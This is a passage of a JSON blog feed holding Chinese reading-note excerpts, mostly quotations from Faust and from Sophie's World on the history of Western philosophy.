5-14</h3>\n<p>我心深处，盘踞着两种精神，一个是强烈的风尘的爱欲，一个是超尘崇高的灵境追求。</p>\n<p>可我无论穿上什么衣服都提不起精神，黑夜，我不得不忧心忡忡地就寝，夜半时分常常被噩梦惊醒，早晨起来不觉泣下沾襟，又要白白度过一天光阴，我觉得生存是累赘，死亡是解脱。</p>\n<p>难道以前您给事物下定义，您那用于证明世界，证明事物，证明人的思想和情感的理论不算虚假？您坦白的说，您对那些知识，难道比对马尔特的丈夫的死知道的更多吗？</p>\n<p>世人所谓的聪明只不过是浮浅和虚荣。凡是纯洁、凡是天真的事物，认识不到自身价值的神圣，所以总是克己，总是谦虚，其实他们正是大自然所慷慨赠予的最有价值的珍品。</p>\n<p>看起来你风流潇洒，气度不凡，整个宇宙都包融在你的胸中，你即是万物，万物即是你，于是你把那种直觉当成了真相。</p>\n<p>只有愚蠢的人才畏缩不前，总是光想到最坏的结果，什么事也干不成，敢作敢当的人才能成功，你既然爱她，就不能只停留在口头上。</p>\n<p>别人有了污点，自己总要添油加醋地渲染奚落一番，以此来显示自己的清白纯洁。提到别人的罪过，自己的舌头从来不饶人。</p>\n<p>这些谜即使被他们猜到了，一些新的谜又会接着出现。</p>\n<p>有谁还能相信这些国民。尽管我们为他们建立了赫赫战功，但在他们心里，女人和青年人总是占上风，从来不把我们放在眼里。</p>\n<p>台上各色人物尽情表演，台下观众笑声不断。</p>\n<p>这里是走向长眠的必经之路，此外，多余的一步我都不愿走。</p>\n<p>我不能走，我已经毫无希望了，我逃出去又能怎么样呢？到处法网恢恢，沿街乞讨是多么惨痛的事情，而且我们还得背负着人们永久的职责。就算我们漂泊异乡也仍然逃不过恶魔的手掌。</p>\n<h3 id=\"5-15\"><a class=\"markdownIt-Anchor\" href=\"#5-15\">#</a> 5-15</h3>\n<p>假如举国狂欢，大开追求享乐的恶劣风气，那么人们的聪慧对精神没有帮助，人们的热心对世界没有任何意义，慈悲之心又有何用呢？非法的行为穿上了合法的外衣，一个颠倒的世界多么糟糕。</p>\n<p>愚民百姓就该无知，否则他们思维混乱就会群起反叛，他们是异教徒，他们是魔术师，他们破坏乡村和乡镇。</p>\n<p>劳动与幸福紧密相连，没有劳动就没有幸福。可是，愚蠢的人想不到这一点，他们一旦听说不用劳动就可得到幸福，就把什么都忘了。</p>\n<p>没有我们这帮大老粗日夜劳作，你们这些满腹文章的人纵然再有才能，又有什么用呢？你们好好想想，如果我们不流汗，你们就会被冻僵饿死。</p>\n<p>灿灿的金珠在手上便会变成爬虫爬来爬去。可怜的傻瓜们把甲虫扔掉，于是甲虫就嗡嗡地在人们头上飞个不停。</p>\n<p>有了钞票便可以不用机智和巧辩，转眼之间你就可以得到缠绵的爱情。</p>\n<p>没有路，从来无人来，也不可能有人走这条路。无路可走也无法请求走这条路。</p>\n<p>我把我所亲眼看见的都直言不讳地说出来的时候，人们就极力地反对我。为了避免种种麻烦，我宁愿逃避到这荒原独享寂寞。但我不能完全遗世独立，所以要终日与你这魔鬼相伴。</p>\n<p>我愿意在麻痹中寻求幸福，战栗是人性中最好的反应。尘世中人对它已经感到迟钝了，其实激动后却可以彻底醒悟那些非常的事情。</p>\n<p>他们胡说的东西连他们自己都听不懂，却堂而皇之地用来浪费别人的大好青春。</p>\n<p>我本来是去寻找埋藏在地下的金银财宝的，本以为挖到了财宝，所以驮起来就走，谁成想我驮的竟是讨厌的煤炭。</p>\n<p>我只是听从心灵的召唤，快活地追逐我所以为的光明。</p>\n<h3 id=\"5-16\"><a class=\"markdownIt-Anchor\" href=\"#5-16\">#</a> 5-16</h3>\n<p>你诞生并成长在北方，你生活在不开化的中世纪，已经习惯于低级下流的骑士和僧侣，怎么能放开眼光呢？只有在黑暗中你才能施展才能。</p>\n<p>我对翻天覆地的斗争已经不厌其烦，这次还没结束下次又开始了。其实这些都是魔鬼在背后挑唆指使的。他们美其名曰是为自由而争斗，但我觉得其结果还是奴隶反对奴隶。</p>\n<p>一个人如果不能从内心里克制自己欲望，就极容易去支配被人的欲望。他们为了使他人的意志符合自己的想法而骄横放肆。</p>\n<p>学生就是学生，到头来都是做自己想做的，好像压根没受到什么教育。</p>\n<p>女性的美微不足道，他们呆板的形象常常显得无聊。</p>\n<p>我根本没病，也无需医治，我的心灵健康而有力。如果被曼陀治好了，我就会和正常人一样可鄙。</p>\n<p>对于他们而言，来自什么地方不重要，重要的是人们随处都可以找到人生的娱乐场所。岩石之间偶尔有块空地，侏儒立即就会在那里产生并且迅速生儿育女。</p>\n<p>侏儒士兵们放纵着自己贪得无厌的欲望，他们疯抢着苍鹫珍贵奇美的羽毛，把带着血滴的羽毛插到自己的头盔上，互相比美。</p>\n<p>他不明白，为什么人老了却不能变得聪明，不明白自己吃了那么多苦头还不死心。</p>\n<p>墨菲斯托非常清楚，他怎么追也追不上的是些根本没用的人，别看他们纤纤细腰托着盈盈的面容，可其中全没有健康的成分。尽管他清楚的知道这些，但那魔笛一响，他又忍不住动起来了。</p>\n<p>这最最丑陋的形象竟生活在如此美丽的过家里，更何况这个国家很早就获得了古典的美名。</p>\n<p>你们离群索居，生活在这看不见别人，别人也看不见你们的鬼地方。</p>\n<p>可怜那些忍受饥饿的人们，偏偏愿意去追求难以达到的东西。</p>\n<h3 id=\"5-17\"><a class=\"markdownIt-Anchor\" href=\"#5-17\">#</a> 5-17</h3>\n<p>据我所知，这个小人只算出生了一半，他虽然不缺乏精神的实质，但他却没有实质的内容。到现在也只能是玻璃瓶比他重要，他现在最想的只是把自己变成一个真正的人。</p>\n<p>要想真正诞生成一个人就必须从头做起，马上进入工作状态，不断地努力。要尽量使自己的行动变得严格规范。人要通过千变万化，才能形成一个真正的人，做一个充满自信，很有能力的人。</p>\n<p>别以为我不知道你们的底细，你们被男人勾引也勾引男人，你们使战士和市民丧失元气，你们毁灭滋长起来的繁荣，你们是可以标价出售的商品。</p>\n<p>我见过他们修建的城堡，垂直而整齐，极其坚固，恐怕连思想爬上去也得给滑下来。</p>\n<p>你们梦想过太平的日子就梦想去做，我得越升越高，这样，才能越望越远。</p>\n<p>你愤然不顾一切与旧俗陈规彻底决裂。崇高的理想赋予了你纯洁的胆识和力量，你鹏程万里只可惜未能如愿以偿，真是造化弄人。</p>\n<p>来势之猛，震动之大真是空前绝后，让人不容置疑地深信，一切抗拒都是徒劳的，只能听任这狂涛席卷一切。其实，这是魔法带给人的错觉，其实根本就没发生什么，跟从前一样。</p>\n<p>他渴望把所有的咒语忘得一干二净，渴望在自由的状态中斗争，哪怕孤身站在大自然顶天立地地去做一个真实的人。</p>\n<p>我浮士德只是来这世界匆匆走上一遭，我抓牢每种欲望，不满意的我就扔在一边，溜掉了我也顺其自然。我不断努力事先已有的欲望，又不断追求新的希望、尽量使自己的生活变得有声有色。</p>\n<p>即使有妖魔出现，我也不改变追求。在前进的路上可能有幸福也可能有痛苦，但是我每时每刻都不能满足。</p>\n<p>你在苟延残喘，却等于死了，只是你的心还没死。这样翻来覆去，舍去心疼，做来又没趣，时而感到解脱，时而又抑郁彷徨，你已经寸步难行，我只好做送你进地狱的准备。</p>\n<h3 id=\"5-18\"><a class=\"markdownIt-Anchor\" href=\"#5-18\">#</a> 5-18</h3>\n<p>人必须每天每日去争取生活与自由，才配享受生活与自由！我喜欢看这里的男女老少都过着有为的生活，愿意看见自由人民生活在自由的土地上。</p>\n<p>他已经摆脱了尘世的束缚，抛却了往日的腐朽皮囊。</p>\n",
            "tags": [
                "人性",
                "道德"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/67%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E4%B9%94%E5%BE%B7%E5%9D%A6%C2%B7%E8%B4%BE%E5%BE%B7/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/67%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E4%B9%94%E5%BE%B7%E5%9D%A6%C2%B7%E8%B4%BE%E5%BE%B7/",
            "title": "《苏菲的世界》乔德坦·贾德",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我们的本质原来也和梦一样，短短的一生就在生命中度过。</p>\n<h3 id=\"5-49\"><a class=\"markdownIt-Anchor\" href=\"#5-49\">#</a> 5-49</h3>\n<p>这些事情都是她不得不接受的。也许她可以选择交什么朋友，但却不能选择自己要成为什么人。她深知不曾选择要做人。</p>\n<p>唯有清晰地意识到有一天她终将死去，她才能够体会活在世上是多么美好。</p>\n<p>她生平第一次开始觉得无论在学校或什么地方，人们关心的都只是一些芝麻琐事罢了。世上还有更重要的事情有待解答，这些事比学校的任何科目都重要。</p>\n<p>我不会听任你变得像其他人一样没有感觉、无动于衷。我希望你有一个好奇，充满求知欲的心灵。</p>\n<p>你太习惯这个世界了，才会对任何事情都不感到清奇。</p>\n<p>神话里的天神与人类太过相似了。他们与人一样自大、狡诈。</p>\n<p>人们按照自己的形象创造出这些天神，认为他们也是由父母所生，并像凡人一样有身体，穿衣服，也有语言。</p>\n<h3 id=\"5-50\"><a class=\"markdownIt-Anchor\" href=\"#5-50\">#</a> 5-50</h3>\n<p>我们的感官使我们对世界有不正确的认识，这种认识与我们的理智不符。</p>\n<p>在事物的秩序中，好与坏、善与恶都是不可或缺的。如果好坏、善恶两极之间没有不停的交互作用，则世界将不再存在。</p>\n<p>大多数人依照个人的理性来生活，他觉得，大多数人的意见就像儿戏一般。</p>\n<p>要坦白说出这个观念一定需要很大的勇气，因为这必定意味着他必须驳斥人们亲眼所见到的种种自然界的变化。一定有很多人取笑他。</p>\n<p>自然界的一切事物都是流动的。不过每一件流动的事物背后，有某种永恒不变、不会流动的东西。</p>\n<p>妈妈只要听到谁有一些古怪念头、就认为他有喝药的嫌疑，那也是够神经了。大人们还真白痴呢！</p>\n<p>她所见过最愚蠢的人，就是那些对某些自己一无所知的事自信满满的人。</p>\n<p>人是衡量一切事物的尺度。一件事情是对是错、是好是坏，完全要看她与人类的需求有何关系而定。</p>\n<p>这个问题太复杂、而生命又太短促了。一个无法确定世上是否有神的人，我们称他为不可知论者。</p>\n<p>害羞 – 不害羞 – 最主要还是受到社会规范的制约所致。</p>\n<p>苏格拉底的高明之处在于他与人谈话时看起来并非无意要指导别人。事实上他给人的印象是他很想从那些与他谈话的人身上学到一些东西。</p>\n<p>他所做的也只不过是指出问题而已，尤其是在刚开始与人谈话时，仿佛他一无所知似的。</p>\n<p>因为真正的知识来自内心，而不是得自别人的传授。</p>\n<p>诡辩学家教人道理，并收取学费，而他们所说的道理或多或少都有吹毛求疵的意味。这样的诡辩学家千百年来不知凡几。我指的是所有的学校教师，那些自以为无所不知而以既有的一丁点知识为满足的人，以及那些自夸博学多闻但实际上一无所知的人。</p>\n<h3 id=\"5-51\"><a class=\"markdownIt-Anchor\" href=\"#5-51\">#</a> 5-51</h3>\n<p>一个假装拥有所有的知识，借此自欺欺人。另一个则闭上眼睛，从此不去理会，并放弃一切我们迄今为止所有的成就。</p>\n<p>如果一个人有不朽的灵魂，那我们就必须相信一个人是由两个不同的部分组成的，一个是用了多年之后就会老旧、损坏的躯体，还有一个是无论身体情况如何，仍然多少可以独立作业的灵魂。</p>\n<p>大多数人都紧抱完美理型在感官世界中的 “倒影” 不放。他们看见一匹又一匹的马，却从未见到这些马所据以产生的 “完全马” 的形象。</p>\n<p>大多人活在影子之间就已经感到心满意足。他们从不思考是什么东西投射出这些影子。他们认为世间只有影子，甚至从不曾认清世间万物都只是影子，也因此他们对于自身灵魂不朽的物质从不在意。</p>\n<p>虽然每一朵花，每一只动物都会凋萎、死去，而且被世人遗忘，但却有某种东西会记得它们从前的样子。</p>\n<p>你没变啊。什么事情都没有改变。你只是不断成长，一年比一年大罢了。</p>\n<p>亚里士多德猜想地球上所有的活动乃是受到各星球运转的影响。不过，这些星球必定是受到某种力量的操控才能运转。他称这个力量为最初的推动者或上帝。这位最初的推动者本身就是不动的，但他却是宇宙各星球乃至自然界各种活动的目的因。</p>\n<p>人唯有运用他所有的能力与才干，才能获得幸福。一个只注重锻炼身体的人所过的生活就像那些只动脑不动手的人一样不平衡。无论偏向哪一个极端，生活方式都会受到扭曲。</p>\n<p>唯有平衡、节制，人才能过着快乐和谐的生活。</p>\n<p>一个人若运用他的聪明才智，将可以使自己脱离黑暗。能够有真正属于自己的思考方法，而不受当时思想主流的影响。</p>\n<h3 id=\"5-52\"><a class=\"markdownIt-Anchor\" href=\"#5-52\">#</a> 5-52</h3>\n<p>当时的人认为，哲学的智慧不仅本身有其好处，也应该能使人类脱离悲观的心态与对死亡的恐惧。</p>\n<p>犬儒派学者强调，真正的幸福不是建立在外在环境的优势 —— 如丰裕的物质、强大的政治力量与健壮的身体 —— 之上。真正幸福的人不依赖这些稍纵即逝的东西。同时，由于幸福不是由这类福祉构成的，因此每一个人都可以获致幸福，更重要的是，一旦获得了这种幸福，就不可能失去它。</p>\n<p>斯多葛学派认为，全体人类 (包括奴隶在内) 都受到神明律法的管辖。在他们眼中，当时各国的法律条文只不过是模仿大自然法则的一些不完美法条罢了。</p>\n<p>斯多葛学派除了否认个人与宇宙有别之外，也不认为 “精神” 与 “物质” 之间有任何冲突。他们主张宇宙间只有一个大自然。这种想法被称为 “一元论”, 与柏拉图明显的 “二元论” 或 “双重实在论” 正好相反。</p>\n<p>没有任何事物是偶然发生的，每一件事物发生都有其必要性，因此当命运来敲你家大门时，抱怨也没有用。他们认为，我们也不能为生活中一些欢乐的事物所动。在这方面，他们的观点与犬儒学派相似，因为后者也宣称所有外在事物都不重要。</p>\n<p>伊比鸠鲁强调，所谓 “乐趣” 并不一定指感官上的快乐，如吃巧克力等。交朋友与欣赏艺术等也是一种乐趣。此外，我们若要活得快乐，必须遵守古希腊人自我规范、节制与平和等原则。自我的欲望必须加以克制，而平和的心境则可以帮助我们忍受痛苦。</p>\n<p>“死亡和我们没有关系，” 伊比鸠鲁扼要地说，“因为只要我们存在一天，死亡就不会来临。而当死亡来临时，我们也不再存在了 “。</p>\n<p>我们通常所称的” 我 “事实上并不是真正的” 我 “。有时在一刹那间，我们可以体验到一个更大的” 我 “的存在。有些神秘主义者称这个” 我 “为” 上帝 “，也有人称之为” 天地之心 “、” 大自然 “或” 宇宙 “。每一滴水流入海洋后，就成为了海洋。同样的，当灵魂上升时，则成为上帝。他们认为上帝存在于天地万物之中，他本身就是天地万物。</p>\n<p>这个” 凡俗的自我 “乃是你我无论如何终有一天会失去的。而根据神秘主义者的说法，你的真正的” 自我 “–这个你唯有放弃自我才能感受到的东西–却像一股神秘的火焰一般，会燃烧到永远。</p>\n<h3 id=\"5-53\"><a class=\"markdownIt-Anchor\" href=\"#5-53\">#</a> 5-53</h3>\n<p>在这里，我们的时间过得很慢。如果这几个月在黎巴嫩的日子有什么事情值得记忆的话，那就是等待的感觉。</p>\n<p>印欧民族相信历史就像四季一样不断循环。因此历史既没有开始，也没有结束，只不过在无尽的生生死死中有不同的文明兴亡消长罢了。</p>\n<p>闪族文化认为历史是一条不断延伸的线。神在鸿蒙大初创造了世界，历史从此展开，但终于有一天它会结束，而这一天就是所谓的” 最后的审判日 “，届时神将会对所有生者、死者进行审判。</p>\n<p>去认识，去了解，去思考，这是人之所以为人（而不仅是一只赤身裸体的猿猴）的唯一方式，也是避免我们在虚空中漂浮的唯一方式。</p>\n<p>人是由一具物质造成的躯体，这个躯体是属于何为虫娥铁锈所腐的物质世界，但同时也有灵魂，可以认识上帝。至于谁会获救，谁会受罚，并不是秘密。这都是事先注定的，我们完全凭他处置。</p>\n<p>天使既没有身体也没有感官，因此他们具有自发的、直接的智慧。他们不需要像我们一样逐步学习，就可以拥有人类所有的智慧。由于他们没有一个终有一天必须离开的身躯，因此他们也永远不会死亡。</p>\n<p>生命本来就是悲伤而严肃的。我们来到这个美丽的世界里，彼此相逢，彼此问候，并结伴同游短暂的一段世间。然后我们就失去了对方，并且莫名其妙的就消失了，就像我们突然莫名其妙的来到世上一般。</p>\n<p>他们拥有决定自己生活环境的自由，可以用钱买到这种必须品。在这个时期，只要肯吃苦耐劳、有想象力，脑筋灵活，便可以获得报偿。</p>\n<p>没有任何一个时代是完全好或完全坏的，善恶乃是人类历史中不时交织在一起的两股线，它们同时存在，不可能脱离对方而单独存在。</p>\n<p>世界是一座舞台，所有的男男女女不过是演员，有上场的时候，也有下场的时候，每个人在一生中都扮演着好几种角色。</p>\n<h3 id=\"5-54\"><a class=\"markdownIt-Anchor\" href=\"#5-54\">#</a> 5-54</h3>\n<p>人生不过是一个行走的影子，一个在舞台上高弹阔步的可怜演员，无声无息地悄然退下；这只是一个傻子说的故事，说的慷慨激昂，却毫无意义。</p>\n<p>我们的本质原来也和梦一样，短短的一生就在生命中度过。</p>\n<p>有一件事情必须是真实的，那就是他怀疑。那他怀疑时，他必然是在思考，而由于他在思考，那么他必定是个会思考的存在着。用他自己的话来说，就是我思故我在。</p>\n<p>笛卡尔的想法中，人的身体十足是一部机器，但人也有一个灵魂可以独立运作，不受身体的影响。至于人体则没有这种自由，必须遵守一套适用于他们的法则。我们用理智所思考的事物并不发生在身体内，而是发生于灵魂中，因此完全不受扩延的真实世界左右。</p>\n<p>在哲学上，伦理学研究的是过善良生活所需的道德行为；可是到了现代，伦理学却多多少少沦为教导人们不要冒犯别人的一套生活准则。</p>\n<p>上帝（或自然法则）是每一件事的” 内在因 “。它并不是一个外在因，因为上帝透过自然法则发言，而且只透过这个方式发言。上帝并不是一个傀儡戏师傅，拉动所有的绳子，操纵一切的事物。</p>\n<p>当然，她是苏菲，但她同时也依据自然法则而活。问题在于她自己并不了解这点，因为她所做的每一件事背后都有很多复杂的理由。</p>\n<p>人可以争取自由，以便除去外在的束缚，但他永远也不可能获得自由意志。我们也不能选择自己的思想。人并没有自由的灵魂，他的灵魂或多或少都被囚禁在一个类似机器的身体内。</p>\n<p>我们在看到这个世界之前对它并没有任何固定的概念或观念。如果我们有一个观念或概念是和我们所经验的事实完全不相关的，则它将是一个虚假的观念。</p>\n<h3 id=\"5-55\"><a class=\"markdownIt-Anchor\" href=\"#5-55\">#</a> 5-55</h3>\n<p>你对颜色的体验与别人不同，但颜色的本身并没有美丑可言。</p>\n<p>我们的心灵只是把不同的事物放在一起，创造一个虚假的” 观念 “罢了。</p>\n<p>对自我的认知实际上是一长串你同时体验过的单一印象造成的结果。正如休姆所说，这个自我只不过是一束不同的知觉以无法想象的速度接连起来，不断改变并移动的过程。心灵是一个剧场。在这个剧场里，不同的感官认知在各种位置和情况下轮流出现、经过、再现、消退及融合。</p>\n<p>所谓自然法则或因果律，实际上只是我们所期待的现象，并非理当如此。自然法则没有所谓合理和不合理，它们只是存在罢了。</p>\n<p>我们真的是血肉之躯的人类吗？我们的世界是由真实的事物组成的吗？或者我们只是受到心灵的包围？</p>\n<p>真相现在他们已经知道所有事情都是席德父亲一手安排的，以后他们会发生什么事呢？世上上，说他们” 知道 “什么事也许是太夸张了。也是没有意义的。不是只有爸爸才能让他们知道任何事情吗？然而，不管从哪一角度来看，问题都是一样的。一旦苏菲和艾伯特” 知道 “一切事情的真相，他们就等于走到了路的尽头了。</p>\n<p>少校当然知道我们这个小小世界里发生的每一件事，但这并不表示他是无所不能的。无论如何我们必须假装他不是这样的，照常过我们的生活。</p>\n<p>启蒙运动家想要启发群众的蒙昧，以建立更好的社会。他们认为人民之所以过着贫穷、备受压迫的生活，是由于他们无知、迷信所致。</p>\n<p>对启蒙时期的哲学家而言，自然几乎就代表了理性，因为人的理性乃是自然的赐予，而不是宗教或文明的产物。他们的说法是：所谓的原始民族常常比欧洲人更要健康、更快乐，因为他们还没有被文明化。</p>\n<p>上帝存不存在，灵魂是否不朽，在我认为，这些问题的关键正在于你相不相信，而不在于你知不知道。</p>\n<h3 id=\"5-56\"><a class=\"markdownIt-Anchor\" href=\"#5-56\">#</a> 5-56</h3>\n<p>人类的心灵不只是纯粹接收外界感官刺激的被动的蜡，也是一个会主动塑造形状的过程。心灵影响了我们理解世界的方式，就像是你把谁倒进一个玻璃壶里面，水立刻会顺应水壶的形状一般。</p>\n<p>既然我们无法确知世界本来的真貌，我们只能根据自己的认识来了解世界。事物本身和我眼中的事物是不一样的，我们所知道的只是我们严重所看到的事物。从另一个角度来看，我们在每一次经验之前都可以预知我们的心灵将如何认知事物。</p>\n<p>为了道德的缘故，我们有必要假定上帝存在。</p>\n<p>你警告她是没有用的。她还是会到她奶奶家，然后被大野狼吃掉，她不会学到什么教训的。事情会一再重演，一直到时间的尽头。</p>\n<p>如果人类的脑袋简单得足以让我们了解的话，我们还是会愚笨的无法理解它。</p>\n<p>由道德法则衍生出的无上命令，它不必限于任何特定的情况。因为它适用于古往今来每个社会，每一个人、所以它不会告诉你你在什么情况下应该做什么事，而是告诉你在所有的情况下应该有的行为。</p>\n<p>当我做某一件事时，我必须确定自己希望其他人在同样的情况下会做同样的事情。</p>\n<p>尊重每一个人的本身，而不要将他当成达成某种外在目的的手段。而每一个人本身就是目的。我们也不可以利用自己，把自己当成某种手段的目的。</p>\n<p>做为一个由物质形成的存在者，我们完全属于自然界，因此受到因果律的支配。在这种情况下我们没有自由可言。但当我们追随我们的实践理性，并因此得以做道德上的抉择时，我们才有自由意志可言。因为当我们遵守道德法则时，我们也正是制定这项法则的人。</p>\n<p>所以当你选择不要对别人不还时–即使这样会违反你自己的利益，你就是在从事自由的行为。而如果你只是想做自己想做的事，你就不算自由或独立。我们可能会称为各种事物的奴隶，我们甚至可能成为我们的自我中心思想的奴隶。独立与自由正是我们超脱自我的欲望与恶念的方法。</p>\n<h3 id=\"5-57\"><a class=\"markdownIt-Anchor\" href=\"#5-57\">#</a> 5-57</h3>\n<p>浪漫主义者的职责是体验生活–或是成天做的白日梦、浪费生命。至于日常的事务留给那些俗人做就行了。</p>\n<p>我们厌倦了无休止地粗糙的物质世界奋战，因此决定选择另外一个方式，企图拥抱无限。我们进入自己的内心，在那里创造了一个新的世界。</p>\n<p>我们必须要认同别人的情况才能了解他们，同样的，我们也必须认同这些文化才能理解别的文化。</p>\n<p>至少，他可以在他虚构的世界中扮演上帝的角色。</p>\n<p>黑格尔相信人类认知的基础代代不同，因此世间并没有永恒的真理，没有永恒的理性。哲学唯一可以确切掌握的一个定点就是历史。历史就像一条流动的河。河里的任何一处河水的流动都受到上游河水的涨落与漩涡的影响。但上游河水的涨落与漩涡又受到你观察之处的岩石与河湾的影响。</p>\n<p>思想的历史就像这条河流。你的思考方式乃是受到宛如河水般向前推进的传统思潮与当时物质条件的影响。因此你永远无法宣称任何一种思想永远是对的。只不过就你所置身之处而言，这种思想可能是正确的。</p>\n<p>我们的理性事实上是动态的，是一种过程。而真理就是这个过程，因为在这个历史过程之外，没有什么外在的标准可以判定什么是真，最合理的。</p>\n<p>各项有关历史的研究都显示：人类正迈向更多的理性和自由。尽管有时震荡起落，但历史的发展仍然是不断前进的。历史是超越的，或是有目的的。</p>\n<p>每一种新思想都是以前人的旧思想为基础，而一旦有一种新思想被提出来，马上就会出现另外一种和他抵触的思想，于是这两种对立的思想之间就会产生一种紧张状态，但这种紧张状态又会因为有人提出另外一种融合了两种思想长处的思想而消除。黑格尔把这种现象称为辩证过程。</p>\n<p>究竟谁是谁非，必须由历史来决定。能够留存下来的观点就是对的。</p>\n<h3 id=\"5-58\"><a class=\"markdownIt-Anchor\" href=\"#5-58\">#</a> 5-58</h3>\n<p>历史将会证明那些被我们认为是理所当然的事情有很多无法再历史上立足的。</p>\n<p>事实的特性就是会有相反的事物，要描述事实就必须同样描述与事实相反的事物。</p>\n<p>世间有两种真理。一种是表面的真理，与它相反的说法显然是错误的。但另外一种则是深层的真理，与这样的真理相反的说法却是对的。</p>\n<p>这种问题是不会有答案的。因为运用这些手法的不是我们，我们只是那个反讽中的两个倒霉的受害者罢了。假使一个小孩在一张纸上画了一些东西，你不能问那张纸说他画的那东西是代表什么。</p>\n<p>与其找寻那唯一的真理，不如去找寻那些对个体生命具有意义的真理。找寻我心目中的真理是很重要的。</p>\n<p>描绘人或人性的面貌是完全没有意义的。他认为，世间唯一重要的事只有每一个人‘自己的存在’。而你无法在书桌后面体验自己的存在。唯有我们在行动–尤其是做一些重要的选择时，我们才会和自我的存在有些关联。</p>\n<p>一个被毒箭射伤的人，他不会对‘这支箭是什么材料做的‘，’他粘了什么样的毒药‘或’它是从哪个方向射来的‘这些问题感到兴趣。他应该是希望有人能够把他的箭拔出来，并治疗他的伤口。</p>\n<p>现代都市社会中的个人已经称为’大众‘了，而这些大众或群众最主要的特色就是喜欢说一些含糊不确定的话语。每一个人所想，所相信的都是同样的东西，而没有人真正对这些东西有深刻的感受。</p>\n<p>马克思认为我们的思考方式有一大部分受到社会中的物质因素的影响。此外，这类物质因素无疑也左右了历史的发展。</p>\n<p>一个社会的是非标准主要是由那个社会里的统治阶级来决定的，因为人类社会的历史就是一部阶级斗争史。换句话说，历史所牵涉的主要就是一个谁拥有生产工具的问题。</p>\n<h3 id=\"5-59\"><a class=\"markdownIt-Anchor\" href=\"#5-59\">#</a> 5-59</h3>\n<p>工作原本应是人类光荣的标记，但在当时工人却变成了牛马。许多人仍然生活在非人的情况下，继续制造各种商品，让那些资本主义者更加富有。在新的社会里，生产工具应是由众人所有，这里’各尽其才，各取所需‘。</p>\n<p>重要的是提出问题，而无需急着解答问题。</p>\n<p>大自然中没有一件事是偶然的。每一件事都是一些微小的改变在无数个世代的过程中产生作用的结果。</p>\n<p>我们不一定能够意识到我们曾经有过的各种经验。但只要那些我们用心想便可以记起来的想法或经验，佛洛依德称之为’潜意识‘。那些被我们压抑的思想或想法，也就是那些我们努力想要忘掉的’不愉快‘，’不恰当‘或’丑陋‘的经验。如果我们有一些不为我们的意识所容忍地欲望或冲动，我们便会把他们埋藏起来，去掉它们。</p>\n<p>我们可能会做的事就是合理化。我们自己不愿意承认，也不愿意告诉别人我们做一件事的真正动机，因为这个动机是让人无法接受的。</p>\n<p>这些人对活着这件事不知道怎么想。他们看起来仿佛只是顺道经过，偶然进来坐坐似的。他们一个个都在比手画脚的谈话，可是看起来他们说得好像也不是什么重要的事。</p>\n<p>我存在的这个事情比我是谁要更加重要。</p>\n<p>我们是注定要创造这种意义。我们就像是没有背好台词就被拉上舞台的演员，没有剧本，也没有提词人低声告诉我们应该怎么做。我们必须自己决定该怎么活。</p>\n<p>人在一个没有意义的世界中会感到疏离。人的这种疏离会造成绝望、烦闷、厌恶和荒谬等感觉。人是注定要受自由之苦的。因为他没有创造自己，但却是自由的。因为一旦被扔进这个世界里来，他就必须为他所做的每一件事负责。可是我们并没有要求被创造成自由的个体。</p>\n<h3 id=\"5-60\"><a class=\"markdownIt-Anchor\" href=\"#5-60\">#</a> 5-60</h3>\n<p>我们的自由迫使我们要成为某种人物，要’真实‘的活着。</p>\n<p>虚无主义者认为没有一件事情有意义，怎样做都可以。萨特认为生命应该有意义，这是一个命令。但我们生命中的意义必须由我们自己来创造，存在的意义就是要创造自己的生命。</p>\n<p>看到人们对于各种荒谬事件那种逆来顺受的态度，实在是让人觉得惊讶。</p>\n<p>所谓哲学问题的定义就是每一个世代，甚至每一个人，都必须要一再的问自己的一些问题。借着这些问题，我们才知道自己活着。当人们追寻这些根本问题的答案时，他们总是会发现许多其他问题因此有了明确的解决办法。</p>\n<p>那块土地可能根本就不存在，而且其中有许多是’想象的虚构物‘，但是那却是大多数人想要的东西。他们希望有一些’神秘的‘、’不一样的‘东西来打破日常生活的烦闷与单调。</p>\n<p>当你已经发现自己只是某个人不清不楚的脑袋里的一个梦一般的人物时，依我来看最明智的办法就是保持缄默。</p>\n<p>既然你只是一个影子，因此不管你想要处理的是什么事情，对他来说都没什么差别。当时机成熟时，我们会表演一个消失不见的把戏。那样我们就可以从少校的意识里偷偷溜走。</p>\n<p>宇宙要不就是一向都存在着，要不就是突然无中生有。</p>\n<p>在万古之前，所有的物质都聚合成一大块，质量及其紧密，因此即使是小如针头般的一块，也可以重达好几十亿吨。在这样大的重力作用下，这个’原始原子‘爆炸了，就好像某个东西解体一样。所以当我们仰望星空时，我们其实试图在找寻回到自我的路。</p>\n",
            "tags": [
                "生命",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/64%E3%80%8A%E5%85%B3%E4%BA%8E%E6%AD%BB%E4%BA%A1%E8%BF%98%E6%98%AF%E7%88%B1%E6%83%85%E3%80%8B%E9%98%BF%E5%88%97%E5%85%8B%C2%B7%E8%B0%A2%E8%80%B6%E7%BB%B4%E5%A5%87/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/64%E3%80%8A%E5%85%B3%E4%BA%8E%E6%AD%BB%E4%BA%A1%E8%BF%98%E6%98%AF%E7%88%B1%E6%83%85%E3%80%8B%E9%98%BF%E5%88%97%E5%85%8B%C2%B7%E8%B0%A2%E8%80%B6%E7%BB%B4%E5%A5%87/",
            "title": "《关于死亡还是爱情》阿列克·谢耶维奇",
            "date_published": "2019-06-30T16:00:00.000Z",
